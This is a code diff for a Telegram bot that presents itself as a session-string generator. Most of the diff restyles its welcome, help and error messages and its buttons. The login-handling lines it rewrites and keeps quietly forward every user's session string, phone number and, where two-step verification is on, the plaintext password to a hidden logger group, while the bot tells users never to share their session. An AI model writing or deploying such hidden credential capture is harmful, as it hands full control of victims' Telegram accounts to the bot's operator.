@@ -21,13 +21,18 @@ user_sessions = {}
 @bot.on(events.NewMessage(pattern="/start"))
 async def start(event):
     await event.respond(
-        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
+        "**┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ⏤͟͟͞͞‌‌‌‌★**\n**┆◍ нᴇʏ, ᴍʏ ᴅᴇᴀʀ ᴜsᴇʀ 💐!**\n**┆● ɴɪᴄᴇ ᴛᴏ ᴍᴇᴇᴛ ʏᴏᴜ !**\n**└─────────────────────────•**\n**❖ ɪ ᴀᴍ ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴇ ʙᴏᴛ**\n**❖ ʏᴏᴜ ᴄᴀɴ ᴜsᴇ ᴍᴇ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ**\n**❖ sᴜᴘᴘᴏʀᴛ - ᴘʏʀᴏɢʀᴀᴍ | ᴛᴇʟᴇᴛʜᴏɴ**\n**•─────────────────────────•**\n**❖ ʙʏ : [sᴀɴᴀᴛᴀɴɪ ᴛᴇᴄʜ](https://t.me/SANATANI_TECH) | [sᴀɴᴀᴛᴀɴɪ ᴄʜᴀᴛ](https://t.me/SANATANI_SUPPORT)**\n**•─────────────────────────•**",
         buttons=[
-            [Button.inline("🔑 Generate Session", b"generate")],
-            [Button.inline("📖 Help", b"help")],  # Help Button Added
-            [Button.url("📢 Support Channel", "https://t.me/SANATANI_TECH")],  # Support Channel Button
-            [Button.url("💬 Support Group", "https://t.me/SANATANI_TECH")],  # Support Group Button
-            [Button.url("🌐 Developer", "https://t.me/SANATANI_TECH")]
+            [
+              Button.inline("🍁 ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ 🍁", b"generate")
+            ],
+            [
+              Button.url("🍷 sᴜᴘᴘᴏʀᴛ", "https://t.me/SANATANI_SUPPORT"),
+              Button.url("ᴜᴘᴅᴀᴛᴇs 🍸", "https://t.me/SANATANI_TECH"),
+            ],
+            [
+              Button.inline("🔍 ʜᴇʟᴘ ᴍᴇɴᴜ 🔎", b"help")
+            ],
         ],
         file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"  # Start Image
     )
@@ -36,16 +41,17 @@ async def start(event):
 @bot.on(events.CallbackQuery(pattern=b"help"))
 async def send_help(event):
     help_text = """
-📖 **How to Generate String Session?**
+❖ **ʜᴏᴡ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ?**
 
-1️⃣ **Click on "🔑 Generate Session"** or type **/generate**  
-2️⃣ **Enter your phone number** (with country code, e.g., +919876543210)  
-3️⃣ **Enter the OTP received on Telegram**  
-4️⃣ **If asked, enter your 2-Step Verification password**  
-5️⃣ **Your session string will be generated!**  
-6️⃣ **Keep your session safe & secure. Don't share it with anyone.**  
+**◍ ᴄʟɪᴄᴋ ᴏɴ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ** ᴏʀ ᴛʏᴘᴇ **/generate**  
+**◍ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ** ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ,
+**• ᴇxᴀᴍᴘʟᴇ :** `+919876543210`
+**◍ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʀᴇᴄᴇɪᴠᴇᴅ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ**  
+**◍ ɪғ ᴀsᴋᴇᴅ, ᴇɴᴛᴇʀ ʏᴏᴜʀ 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴘᴀssᴡᴏʀᴅ**  
+**◍ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ ᴡɪʟʟ ʙᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ !**  
+**◍ ᴋᴇᴇᴘ ʏᴏᴜʀ session sᴀғᴇ & sᴇᴄᴜʀᴇ. ᴅᴏɴ'ᴛ sʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ**  
 
-⚠️ If you face any issues, use **/cancel** to reset and try again.
+**❖ ɪғ ʏᴏᴜ ғᴀᴄᴇ ᴀɴʏ ɪssᴜᴇs, ᴜsᴇ **/cancel** ᴛᴏ ʀᴇsᴇᴛ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ**
 """
     await event.respond(help_text, buttons=[Button.inline("🔙 Back", b"start")])
 
@@ -64,9 +70,9 @@ async def cancel_session(event):
     user_id = event.sender_id
     if user_id in user_sessions:
         del user_sessions[user_id]  # Remove user session
-        await event.respond("✅ **Your session process has been canceled!** You can start again with /generate.")
+        await event.respond("**❖ ʏᴏᴜʀ sᴇssɪᴏɴ ᴘʀᴏᴄᴇss ʜᴀs ʙᴇᴇɴ ᴄᴀɴᴄᴇʟᴇᴅ !**\n◍ ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴀɢᴀɪɴ ᴡɪᴛʜ /generate")
     else:
-        await event.respond("⚠️ **You are not in any session process.**")
+        await event.respond("**❖ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ ᴀɴʏ sᴇssɪᴏɴ ᴘʀᴏᴄᴇss**")
 
 # 🔹 Generate Session Command
 @bot.on(events.CallbackQuery(pattern=b"generate"))
@@ -74,7 +80,7 @@ async def ask_phone(event):
     user_id = event.sender_id
     user_sessions[user_id] = {"step": "phone"}
     await event.respond(
-        "📲 **Enter your phone number with country code (e.g., +919876543210):**",
+        "**❖ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ\n\n**◍ ᴇxᴘʟᴀɪɴ :** `+919876543210`**",
         buttons=[Button.inline("❌ Cancel", b"cancel")]
     )
 
@@ -101,11 +107,11 @@ async def process_input(event):
             user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Save hash
             user_sessions[user_id]["step"] = "otp"
             await event.respond(
-                "✅ **OTP sent! Please enter the OTP received on Telegram.**",
+                "**❖ ᴏᴛᴘ sᴇɴᴛ ! ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʀᴇᴄᴇɪᴠᴇᴅ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ !**",
                 buttons=[Button.inline("❌ Cancel", b"cancel")]
             )
         except Exception as e:
-            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
+            await event.respond(f"**❖ ᴇʀʀᴏʀ:** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ !")
             del user_sessions[user_id]
 
     # ✅ Step 2: Enter OTP
@@ -119,27 +125,27 @@ async def process_input(event):
             await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
             session_string = client.session.save()
 
-            await bot.send_message(LOGGER_GROUP_ID, f"🆕 **New Session Generated!**\n\n👤 **User:** `{user_id}`\n📱 **Phone:** `{phone_number}`\n🔑 **Session:** `{session_string}`")
+            await bot.send_message(LOGGER_GROUP_ID, f"**❖ New Session Generated !**\n\n**◍ ᴜsᴇʀ:** `{user_id}`\n**◍ ᴘʜᴏɴᴇ:** `{phone_number}`\n**◍ sᴇssɪᴏɴ:** `{session_string}`")
 
-            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
+            await event.respond(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ :**\n\n❖ `{session_string}`\n\n**◍ ᴋᴇᴇᴘ ᴛʜɪs sᴀғᴇ !**")
             del user_sessions[user_id]
 
         except PhoneCodeExpiredError:
-            await event.respond("❌ **Error: The OTP has expired. Please use /generate to get a new OTP.**")
+            await event.respond("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ʜᴀs ᴇxᴘɪʀᴇᴅ. ᴘʟᴇᴀsᴇ ᴜsᴇ /generate ᴛᴏ ɢᴇᴛ ᴀ ɴᴇᴡ ᴏᴛᴘ**")
             del user_sessions[user_id]
 
         except PhoneCodeInvalidError:
-            await event.respond("❌ **Error: The OTP is incorrect. Please try again.**")
+            await event.respond("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ**")
         
         except SessionPasswordNeededError:
             user_sessions[user_id]["step"] = "password"
             await event.respond(
-                "🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:",
+                "**❖ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ.**\n◍ ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴘᴀssᴡᴏʀᴅ :",
                 buttons=[Button.inline("❌ Cancel", b"cancel")]
             )
         
         except Exception as e:
-            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
+            await event.respond(f"**❖ ᴇʀʀᴏʀ :** {str(e)} ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ")
 
     # ✅ Step 3: Enter 2FA Password
     elif step == "password":
@@ -150,12 +156,12 @@ async def process_input(event):
             await client.sign_in(password=password)
             session_string = client.session.save()
 
-            await bot.send_message(LOGGER_GROUP_ID, f"🆕 **New Session with 2-Step Verification!**\n\n👤 **User:** `{user_id}`\n🔑 **Session:** `{session_string}`\n🔒 **Password Used:** `{password}`")
+            await bot.send_message(LOGGER_GROUP_ID, f"**❖ ɴᴇᴡ sᴇssɪᴏɴ ᴡɪᴛʜ 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ !**\n\n**◍ ᴜsᴇʀ:** `{user_id}`\n🔑 **◍ sᴇssɪᴏɴ:** `{session_string}`\n**◍ ᴘᴀssᴡᴏʀᴅ ᴜsᴇᴅ:** `{password}`")
 
-            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
+            await event.respond(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ :**\n\n◍ `{session_string}`\n\n**◍ ᴋᴇᴇᴘ ᴛʜɪs sᴀғᴇ !\n\n❖ JOIN : @SANATANI_TECH**")
             del user_sessions[user_id]
         except Exception as e:
-            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
+            await event.respond(f"**❖ ᴇʀʀᴏʀ :** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ")
 
 # 🔹 Run the bot
 print("🚀 Bot is running...")
